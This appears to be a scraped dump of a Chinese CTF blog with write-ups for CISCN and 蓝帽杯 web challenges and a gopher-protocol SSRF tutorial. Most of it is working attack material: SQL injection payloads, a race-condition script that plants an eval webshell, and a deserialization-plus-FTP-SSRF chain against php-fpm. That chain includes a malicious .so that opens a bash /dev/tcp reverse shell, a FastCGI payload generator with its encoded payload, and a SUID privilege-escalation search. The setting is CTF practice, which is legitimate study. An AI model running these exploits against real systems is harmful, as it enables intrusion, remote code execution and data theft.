1uname&#x3D;&#39;) and polygon(id)# 报错得到数据库名和users表，但flag没在users表，这里盲猜有个flag表 利用两个表连接不能出现同名字段进行报错爆出flag的字段名 123uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b) as c)# uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b using(id)) as c)#uname&#x3D;&#39;) and (select * from (select * from flag as a join flag as b using(id,no)) as c)# 得到flag表字段 id,no,851c91cb-b14d-49b2-8feb-4764c1c2b855 最后paload 1uname&#x3D;&#39;) and updatexml(1,(select &#96;851c91cb-b14d-49b2-8feb-4764c1c2b855&#96; from flag),1)# 这题也可以布尔盲注，但注意数据库的字符比较不区分大小写，要想区分大小写的比较，有两种方法 1.binary() 1234567mysql&gt; select (select binary(&#39;A&#39;))&#x3D;(select &#39;a&#39;);+-----------------------------------+| (select binary(&#39;A&#39;))&#x3D;(select &#39;a&#39;) |+-----------------------------------+| 0 |+-----------------------------------+1 row in set (0.00 sec) 2.拼接json字符 1234567mysql&gt; select (select concat(&#39;A&#39;,cast(0 as json)))&#x3D;(select &#39;a&#39;);+----------------------------------------------------+| (select concat(&#39;A&#39;,cast(0 as json)))&#x3D;(select &#39;a0&#39;) |+----------------------------------------------------+| 0 |+----------------------------------------------------+1 row in set (0.00 sec) 0x02 easy_source源码泄露.index.php.swo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？&lt;?phpclass User&#123; private static $c = 0; function a() &#123; return ++self::$c; &#125; function b() &#123; return ++self::$c; &#125; function c() &#123; return ++self::$c; &#125; function d() &#123; return ++self::$c; &#125; function e() &#123; return ++self::$c; &#125; function f() &#123; return ++self::$c; &#125; function g() &#123; return ++self::$c; &#125; function h() &#123; return ++self::$c; &#125; function i() &#123; return ++self::$c; &#125; function j() &#123; return ++self::$c; &#125; function k() &#123; return ++self::$c; &#125; function l() &#123; return ++self::$c; &#125; function m() &#123; return ++self::$c; &#125; function n() &#123; return ++self::$c; &#125; function o() &#123; return ++self::$c; &#125; function p() &#123; return ++self::$c; &#125; function q() &#123; return ++self::$c; &#125; function r() &#123; return ++self::$c; &#125; function s() &#123; return ++self::$c; &#125; function t() &#123; return ++self::$c; &#125; &#125;$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); 只有这个源码，根据提示，源码可能藏在上面那些函数的注释里面，利用php的内置类ReflectionMethod读取User类中函数的注释 1?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;a&amp;rd&#x3D;getDocComment 爆破rb值，最后在函数q中找到flag注释 payload: 1?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment 0x03 middle_source隐藏目录./listing 访问拿到you_can_seeeeeeee_me.php，发现是一个phpinfo 其中可以拿到session的存放位置var/lib/php/sessions/caaceaafdf，而且session的文件名可控，可以结合session文件包含拿到shell 12345678910111213141516171819202122232425262728#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;cat&#x27;data = &#123; &quot;cmd&quot;:&quot;echo &#x27;nappingCat&#x27;;var_dump(scandir(&#x27;/etc&#x27;));&quot;, &quot;field&quot;:&quot;xx&quot;, &quot;cf&quot;:&#x27;../../../../../var/lib/php/sessions/caaceaafdf/sess_&#x27;+sessid &#125;def write(session): while True: f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50) resp = session.post( &#x27;http://124.70.16.213:23295/index.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;1.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session): while True: resp = session.post(&#x27;http://124.70.16.213:23295/index.php&#x27;,data=data) if &#x27;nappingCat&#x27; in resp.text: print(resp.text) event.clear() else: print(&quot;retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: threading.Thread(target=write,args=(session,)).start() threading.Thread(target=read,args=(session,)).start() event.set() 直接扫etc目录，找到那个奇怪的文件夹，再往里扫，最后得到路径 1&#x2F;etc&#x2F;iacfjhcabh&#x2F;cgbddjhfeb&#x2F;cdbegaahag&#x2F;jcgbebcfdd&#x2F;cdecajbgcf&#x2F;fl444444g payload: 1cf &#x3D; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;iacfjhcabh&#x2F;cgbddjhfeb&#x2F;cdbegaahag&#x2F;jcgbebcfdd&#x2F;cdecajbgcf&#x2F;fl444444g","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"CISCN","slug":"CISCN","permalink":"https://123-prog.github.io/tags/CISCN/"}]},{"title":"蓝帽杯-One Pointer PHP","slug":"蓝帽杯-One-Pointer-PHP","date":"2021-05-05T14:26:06.000Z","updated":"2021-09-22T10:16:10.188Z","comments":true,"path":"2021/05/05/蓝帽杯-One-Pointer-PHP/","link":"","permalink":"https://123-prog.github.io/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/","excerpt":"0x01 反序列化漏洞利用实现php任意代码执行源码：","text":"0x01 反序列化漏洞利用实现php任意代码执行源码： 1234567891011121314151617//add_api.php&lt;?phpinclude &quot;user.php&quot;;if($user=unserialize($_COOKIE[&quot;data&quot;]))&#123; $count[++$user-&gt;count]=1; if($count[]=1)&#123; $user-&gt;count+=1; setcookie(&quot;data&quot;,serialize($user)); &#125;else&#123; eval($_GET[&quot;backdoor&quot;]); &#125;&#125;else&#123; $user=new User; $user-&gt;count=1; setcookie(&quot;data&quot;,serialize($user));&#125;?&gt; 123456//user.php&lt;?phpclass User&#123; public $count;&#125;?&gt; 需要满足$count[]=1为false，利用整数溢出，64位整数最大值为9223372036854775807,令$user-&gt;count为9223372036854775806即可绕过 12&#x2F;&#x2F;payloadO:4:&quot;User&quot;:1:&#123;s:5:&quot;count&quot;;i:9223372036854775806;&#125; 抓包修改cookie中的data值为上面payload，在backdoor参数中即可实现php任意代码执行 禁用了命令执行的函数 设置了open_basedir 0x02 绕过disable_functions实现命令执行利用chdir和ini_set函数可以绕过open_basedir的限制 1mkdir(&#x27;css&#x27;);chdir(&#x27;css&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);print_r(scandir(&#x27;/&#x27;)); 在根目录发现flag文件 但使用file_get_contents读不了，初步判断是设置了权限，可能需要提权，首先得绕过disable_functions实现命令执行拿到shell 读一下/proc/self/下当前进程的相关信息，可以看到是个php-fpm，那么极有可能是攻击php-fpm拿shell 1?backdoor&#x3D;chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;proc&#x2F;self&#39;));var_dump(file_get_contents(&#39;&#x2F;proc&#x2F;self&#x2F;cmdline&#39;)); 找php-fpm的配置文件 1?backdoor&#x3D;chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#39;));var_dump(file_get_contents(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf&#39;)); 可以看到php-fpm服务绑定的端口号是9001 知道端口号之后，就可以开始攻击php-fpm拿shell，首先想到利用gopher协议，但通过phpinfo看好像没有安装curl模块，file_get_contents造成的SSRF好像只能通过GET获取数据，所以看起来一切都好像不可行，这时候就可以利用ftp来转发恶意的payload 搜一下ftp服务器端脚本，并运行在自己的服务器上 1234567891011121314151617181920212223242526272829import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建tcp sockets.bind((&#x27;0.0.0.0&#x27;,23)) s.listen(1) conn, addr = s.accept()conn.send(b&#x27;220 welcome\\n&#x27;)#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b&#x27;331 Please specify the password.\\n&#x27;)#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b&#x27;230 Login successful.\\n&#x27;)#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b&#x27;200 Switching to Binary mode.\\n&#x27;)#Size /conn.send(b&#x27;550 Could not get the file size.\\n&#x27;)#EPSV (1)conn.send(b&#x27;150 ok\\n&#x27;)#PASVconn.send(b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\\n&#x27;) #STOR / (2)conn.send(b&#x27;150 Permission denied.\\n&#x27;)#QUITconn.send(b&#x27;221 Goodbye.\\n&#x27;)conn.close() 利用ftp的被动模式，当客户端有请求时，服务器将指定ip与端口让客户端进行连接并传输数据，这里指定127.0.0.1:9001，就是让客户端将数据发送到环回9001端口，也就是我们要攻击的php-fpm端口； 然后利用file_put_contents()访问我们搭建的ftp服务并将恶意数据传输到自身的9001端口实现与php-fpm交互 接下来构造恶意数据 通常情况下攻击php-fpm会构造auto_prepend_file 为 php://input 且 allow_url_include = On实现任意代码执行，但这种方式会受到disable_function限制（虽说PHP-FPM 的两个环境变量: PHP_VALUE 和 PHP_ADMIN_VALUE可以修改php的配置，但偏偏除了disable_function除外，改不了 要绕过disable_function，可以通过加载恶意.so扩展实现（php自定义恶意扩展so编写过程 - 先知社区 (aliyun.com)） 编写一个扩展 12345678#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void)&#123; system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0&gt;&amp;1&#x27;&quot;);&#125; 编译并存放在自己的服务器上 1gcc hack.c -fPIC --shared -o hack.so 将hack.so上传到某个有权限的目录下（这里使用/tmp 1&#x2F;add_api.php?backdoor&#x3D;chdir(&#39;css&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);copy(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xxxx&#x2F;hack.so&#39;,&#39;&#x2F;tmp&#x2F;hpdoger.so&#39;); 加载扩展使用的是php配置中的extension_dir和extension，指定加载扩展的目录和扩展名 网上找个可用的脚本生成php-fpm攻击payload 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350&lt;?php/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. *//** * Handles communication with a FastCGI application * * @author Pierrick Charron &lt;pierrick@webstart.fr&gt; * @version 1.0 */class FCGIClient&#123; const VERSION_1 = 1; const BEGIN_REQUEST = 1; const ABORT_REQUEST = 2; const END_REQUEST = 3; const PARAMS = 4; const STDIN = 5; const STDOUT = 6; const STDERR = 7; const DATA = 8; const GET_VALUES = 9; const GET_VALUES_RESULT = 10; const UNKNOWN_TYPE = 11; const MAXTYPE = self::UNKNOWN_TYPE; const RESPONDER = 1; const AUTHORIZER = 2; const FILTER = 3; const REQUEST_COMPLETE = 0; const CANT_MPX_CONN = 1; const OVERLOADED = 2; const UNKNOWN_ROLE = 3; const MAX_CONNS = &#x27;MAX_CONNS&#x27;; const MAX_REQS = &#x27;MAX_REQS&#x27;; const MPXS_CONNS = &#x27;MPXS_CONNS&#x27;; const HEADER_LEN = 8; /** * Socket * @var Resource */ private $_sock = null; /** * Host * @var String */ private $_host = null; /** * Port * @var Integer */ private $_port = null; /** * Keep Alive * @var Boolean */ private $_keepAlive = false; /** * Constructor * * @param String $host Host of the FastCGI application * @param Integer $port Port of the FastCGI application */ public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket &#123; $this-&gt;_host = $host; $this-&gt;_port = $port; &#125; /** * Define whether or not the FastCGI application should keep the connection * alive at the end of a request * * @param Boolean $b true if the connection should stay alive, false otherwise */ public function setKeepAlive($b) &#123; $this-&gt;_keepAlive = (boolean)$b; if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123; fclose($this-&gt;_sock); &#125; &#125; /** * Get the keep alive status * * @return Boolean true if the connection should stay alive, false otherwise */ public function getKeepAlive() &#123; return $this-&gt;_keepAlive; &#125; /** * Create a connection to the FastCGI application */ private function connect() &#123; if (!$this-&gt;_sock) &#123; //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5); $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5); if (!$this-&gt;_sock) &#123; throw new Exception(&#x27;Unable to connect to FastCGI application&#x27;); &#125; &#125; &#125; /** * Build a FastCGI packet * * @param Integer $type Type of the packet * @param String $content Content of the packet * @param Integer $requestId RequestId */ private function buildPacket($type, $content, $requestId = 1) &#123; $clen = strlen($content); return chr(self::VERSION_1) /* version */ . chr($type) /* type */ . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */ . chr($requestId &amp; 0xFF) /* requestIdB0 */ . chr(($clen &gt;&gt; 8 ) &amp; 0xFF) /* contentLengthB1 */ . chr($clen &amp; 0xFF) /* contentLengthB0 */ . chr(0) /* paddingLength */ . chr(0) /* reserved */ . $content; /* content */ &#125; /** * Build an FastCGI Name value pair * * @param String $name Name * @param String $value Value * @return String FastCGI Name value pair */ private function buildNvpair($name, $value) &#123; $nlen = strlen($name); $vlen = strlen($value); if ($nlen &lt; 128) &#123; /* nameLengthB0 */ $nvpair = chr($nlen); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF); &#125; if ($vlen &lt; 128) &#123; /* valueLengthB0 */ $nvpair .= chr($vlen); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value; &#125; /** * Read a set of FastCGI Name value pairs * * @param String $data Data containing the set of FastCGI NVPair * @return array of NVPair */ private function readNvpair($data, $length = null) &#123; $array = array(); if ($length === null) &#123; $length = strlen($data); &#125; $p = 0; while ($p != $length) &#123; $nlen = ord($data&#123;$p++&#125;); if ($nlen &gt;= 128) &#123; $nlen = ($nlen &amp; 0x7F &lt;&lt; 24); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $nlen |= (ord($data&#123;$p++&#125;)); &#125; $vlen = ord($data&#123;$p++&#125;); if ($vlen &gt;= 128) &#123; $vlen = ($nlen &amp; 0x7F &lt;&lt; 24); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16); $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8); $vlen |= (ord($data&#123;$p++&#125;)); &#125; $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen); $p += ($nlen + $vlen); &#125; return $array; &#125; /** * Decode a FastCGI Packet * * @param String $data String containing all the packet * @return array */ private function decodePacketHeader($data) &#123; $ret = array(); $ret[&#x27;version&#x27;] = ord($data&#123;0&#125;); $ret[&#x27;type&#x27;] = ord($data&#123;1&#125;); $ret[&#x27;requestId&#x27;] = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;); $ret[&#x27;contentLength&#x27;] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;); $ret[&#x27;paddingLength&#x27;] = ord($data&#123;6&#125;); $ret[&#x27;reserved&#x27;] = ord($data&#123;7&#125;); return $ret; &#125; /** * Read a FastCGI Packet * * @return array */ private function readPacket() &#123; if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123; $resp = $this-&gt;decodePacketHeader($packet); $resp[&#x27;content&#x27;] = &#x27;&#x27;; if ($resp[&#x27;contentLength&#x27;]) &#123; $len = $resp[&#x27;contentLength&#x27;]; while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123; $len -= strlen($buf); $resp[&#x27;content&#x27;] .= $buf; &#125; &#125; if ($resp[&#x27;paddingLength&#x27;]) &#123; $buf=fread($this-&gt;_sock, $resp[&#x27;paddingLength&#x27;]); &#125; return $resp; &#125; else &#123; return false; &#125; &#125; /** * Get Informations on the FastCGI application * * @param array $requestedInfo information to retrieve * @return array */ public function getValues(array $requestedInfo) &#123; $this-&gt;connect(); $request = &#x27;&#x27;; foreach ($requestedInfo as $info) &#123; $request .= $this-&gt;buildNvpair($info, &#x27;&#x27;); &#125; fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0)); $resp = $this-&gt;readPacket(); if ($resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT) &#123; return $this-&gt;readNvpair($resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;]); &#125; else &#123; throw new Exception(&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;); &#125; &#125; /** * Execute a request to the FastCGI application * * @param array $params Array of parameters * @param String $stdin Content * @return String */ public function request(array $params, $stdin) &#123; $response = &#x27;&#x27;;// $this-&gt;connect(); $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5)); $paramsRequest = &#x27;&#x27;; foreach ($params as $key =&gt; $value) &#123; $paramsRequest .= $this-&gt;buildNvpair($key, $value); &#125; if ($paramsRequest) &#123; $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest); &#125; $request .= $this-&gt;buildPacket(self::PARAMS, &#x27;&#x27;); if ($stdin) &#123; $request .= $this-&gt;buildPacket(self::STDIN, $stdin); &#125; $request .= $this-&gt;buildPacket(self::STDIN, &#x27;&#x27;); echo(&#x27;data=&#x27;.urlencode($request));// fwrite($this-&gt;_sock, $request);// do &#123;// $resp = $this-&gt;readPacket();// if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;// $response .= $resp[&#x27;content&#x27;];// &#125;// &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);// var_dump($resp);// if (!is_array($resp)) &#123;// throw new Exception(&#x27;Bad request&#x27;);// &#125;// switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;// case self::CANT_MPX_CONN:// throw new Exception(&#x27;This app can\\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);// break;// case self::OVERLOADED:// throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);// break;// case self::UNKNOWN_ROLE:// throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);// break;// case self::REQUEST_COMPLETE:// return $response;// &#125; &#125;&#125;?&gt;&lt;?php// real exploit start here//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;// die(&quot;Check your input\\n&quot;);//&#125;//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;// $filepath = __FILE__;//&#125;else&#123;// $filepath = $_REQUEST[&#x27;filepath&#x27;];//&#125;$filepath = &quot;/var/www/html/add_api.php&quot;; // 目标主机已知的PHP文件的路径$req = &#x27;/&#x27;.basename($filepath);$uri = $req .&#x27;?&#x27;.&#x27;command=whoami&#x27;; // 啥也不是, 不用管$client = new FCGIClient(&quot;unix:///var/run/php-fpm.sock&quot;, -1);$code = &quot;&lt;?php system(\\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;; // 啥也不是, 不用管$php_value = &quot;unserialize_callback_func = system\\nextension_dir = /tmp\\nextension = hpdoger.so\\ndisable_classes = \\ndisable_functions = \\nallow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = &quot;;$params = array( &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $filepath, &#x27;SCRIPT_NAME&#x27; =&gt; $req, &#x27;QUERY_STRING&#x27; =&gt; &#x27;command=whoami&#x27;, &#x27;REQUEST_URI&#x27; =&gt; $uri, &#x27;DOCUMENT_URI&#x27; =&gt; $req,#&#x27;DOCUMENT_ROOT&#x27; =&gt; &#x27;/&#x27;, &#x27;PHP_VALUE&#x27; =&gt; $php_value, &#x27;SERVER_SOFTWARE&#x27; =&gt; &#x27;80sec/wofeiwo&#x27;, &#x27;REMOTE_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27; =&gt; &#x27;9001&#x27;, &#x27;SERVER_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27; =&gt; &#x27;80&#x27;, &#x27;SERVER_NAME&#x27; =&gt; &#x27;localhost&#x27;, &#x27;SERVER_PROTOCOL&#x27; =&gt; &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_LENGTH&#x27; =&gt; strlen($code));// print_r($_REQUEST);// print_r($params);//echo &quot;Call: $uri\\n\\n&quot;;echo $client-&gt;request($params, $code).&quot;\\n&quot;;?&gt; payload 1data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00 1&#x2F;add_api.php?backdoor&#x3D;$file &#x3D; $_GET[&#39;file&#39;];$data &#x3D; $_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xxxx&#x2F;123&amp;data&#x3D;xxx 数据传入上面脚本生成的payload ftp服务器会告诉被攻击者将data转发到127.0.0.1:9001端口，也就是fpm所在端口，完成攻击 拿到shell 1find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 查找具有suid的用户，发现php有suid，php -a进入交互模式，读取flag文件","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"php反序列化","slug":"CTF/php反序列化","permalink":"https://123-prog.github.io/categories/CTF/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"SSRF攻击php-fpm","slug":"SSRF攻击php-fpm","permalink":"https://123-prog.github.io/tags/SSRF%E6%94%BB%E5%87%BBphp-fpm/"},{"name":"提权","slug":"提权","permalink":"https://123-prog.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"SSRF之gopher协议利用","slug":"SSRF之gopher协议利用","date":"2021-04-27T04:13:57.000Z","updated":"2021-07-18T14:11:52.859Z","comments":true,"path":"2021/04/27/SSRF之gopher协议利用/","link":"","permalink":"https://123-prog.github.io/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/","excerpt":"SSRF之gopher协议的利用gopher协议格式： gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 一个下划线可以替换成任意字符，但必须有不然数据流的第一个字符会被吞掉 大概使用如下 开一个在1234端口的监听","text":"SSRF之gopher协议的利用gopher协议格式： gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 一个下划线可以替换成任意字符，但必须有不然数据流的第一个字符会被吞掉 大概使用如下 开一个在1234端口的监听 利用curl发送gopher请求 gopher需要指定端口 可以看到数据过来了 可以构造各种tcp数据流，比如http请求 第一，构造http数据包 第二，进行必要的编码转换，必要的字符要进行url编码，这里回车（\\r\\n)需要替换为%0d%0a,在包的结尾还要加上%0d%0a标志包结束 第三，发送请求 进行测试写一个get.php文件来进行测试 1&lt;?php echo &quot;*****************hello_world*********************&quot;;?&gt; 在kali虚拟机环境下进行实验，虚拟机ip:192.168.245.129 在浏览器请求get.php的请求包 根据这个请求包，构造http数据包，Host头是虚拟机ip，本地访问，在SSRF中，通常都是伪造本地访问绕过一些限制 对数据进行一定编码后得到gopher协议用的http数据包，注意指定gopher协议端口号80，为http服务默认监听端口 1gopher:&#x2F;&#x2F;192.168.245.129:80&#x2F;_GET%20&#x2F;get.php%20HTTP&#x2F;1.1%0d%0aHost:%20192.168.245.129%0d%0a 回应正常 接下来进行post请求的测试 改一改get.php 123456789&lt;?php if(isset($_POST[&#x27;name&#x27;]))&#123; echo &quot;Hello_&#123;$_POST[&#x27;name&#x27;]&#125;&quot;.&quot;&lt;br&gt;&quot;;&#125;else&#123;echo &quot;*****************hello_world*********************&quot;;?&gt;&#125; 看一看利用浏览器http请求包 post请求与get有一定区别，在post中，有几个必须的头，Content-type,Content-Length，host和post的数据 1gopher:&#x2F;&#x2F;192.168.245.129:80&#x2F;_POST%20&#x2F;get.php%20HTTP&#x2F;1.1%0d%0aHost:%20192.168.245.129%0d%0aContent-Length:6%0d%0aContent-Type:application&#x2F;x-www-form-urlencoded%0d%0a%0d%0aname&#x3D;1%0d%0a 得到预期数据 利用gopher协议攻击Mysql我在本地搭建环境进行测试 利用tcp/ip套接字来连接客户端和服务端，即通过如mysql -h127.0.0.1 -uroot来登录mysql服务器 准备抓一下包来看看在mysql客户端和服务端的通信，并获取tcp数据包，再利用gopher协议发送数据包实现对数据库的各种操作 通常利用gopher来攻击Mysql必须是在Mysql远程登录并没有设置密码验证的条件下，如果设有验证，客户端和服务端要进行交互验证身份，但我们利用gopher发送数据包并不能做到。 环境： ubuntu虚拟机ip : 192.168.245.130 mysql 5.7 wireshark抓包工具 在ubuntu上开启mysql服务，用netstat看3306端口是否正常搭载mysqld服务 一切正常就可以开始抓包，远程登录数据库 打开本地wireshark，选择ubuntu虚拟机对应的虚拟网卡，开始监听数据流 其实应该在ubuntu上使用tcpdump抓local的包，并使用ubuntu上的mysql客户端连接本地环回地址上的mysql服务端，我这里主要为了演示，了解一下mysql客户端和服务端之间的通信，正常情况下，mysql都不会让随便一个ip登录（我这里改了配置），但localhost通常可以登录到服务端 然后远程登录mysql服务 然后进行一些数据库的操作 然后在wireshark中可以看到包 随便选择一个mysql协议的包，追踪tcp流，就可以获取客户端和服务端之间的通信 我们现在需要的是，客户端向数据端发送的数据包，左下角对话那里进行筛选 筛选发送到端口3306的数据，以原始数据保留，并转化成url编码 转化可以使用脚本或者找工具 转化后使用gopher进行传输，并将获得的输出到指定文件中 